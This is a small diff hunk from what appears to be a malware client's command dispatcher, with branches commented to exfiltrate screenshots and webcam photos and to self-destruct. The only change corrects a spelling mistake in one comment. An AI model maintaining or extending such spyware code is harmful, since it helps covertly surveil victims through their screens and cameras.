@@ -77,7 +77,7 @@ def execcmd(cmd: list[str]):
         get(cp)
     elif ct == "sc": # exfiltrate screenshot
         sc()
-    elif ct == "cam": # exfiltrate webcame photo
+    elif ct == "cam": # exfiltrate webcam photo
         cam()
     elif ct == "sd": # self destruct
         sd()
